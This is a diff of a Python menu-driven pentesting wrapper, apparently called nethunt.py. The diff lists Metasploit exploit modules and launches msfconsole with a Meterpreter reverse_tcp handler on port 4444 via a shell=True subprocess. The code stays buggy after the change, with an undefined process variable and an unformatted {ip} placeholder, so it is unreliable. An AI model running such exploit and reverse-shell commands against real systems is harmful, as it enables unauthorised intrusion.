@@ -512,15 +512,13 @@ def metasploit_scan():
                 "44": "exploit/unix/ftp/vsftpd_234_backdoor",
                 "55": "exploit/multi/http/struts2_code_exec",
                 "66": "exploit/multi/http/jboss_deployment_scanner"
-
               }
-
-              for key, value in metasploit_command():
+              for key, value in exploits.items():
                 print(f"{key}: {value}")
               exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
-              if exploit_choice in metasploit_command:
-                metasploit_command = "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j'" 
-                subprocess.Popen(metasploit_command, shell=True) 
+              if exploit_choice in exploits:
+                metasploit_command = "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j\""
+                subprocess.Popen(metasploit_command, shell=True)
                 stdout, stderr = process.communicate()
                 if stderr:
                    print(Fore.RED + "Error during Metasploit:", stderr.decode())
@@ -656,7 +654,7 @@ def routersploit_scan():
 def main_menu():
    while True:
       show_main_menu_logo()
-      print(Fore.YELLOW+ "Run Root To Save Results of Nmap Scans: sudo python3 nethunt.py")
+      print(Fore.YELLOW+ "Run Root To Save Results of Nmap Scans: sudo python3 nethunt.py & Updates")
       print(Fore.LIGHTGREEN_EX+"alot broken accept nmap and sslscan only manual scan is broken for sslscan finish comming soon!...")
       print(Fore.LIGHTYELLOW_EX + "V 0.1 biskit@")
       print(Fore.LIGHTWHITE_EX+"1. Automatic Scan")
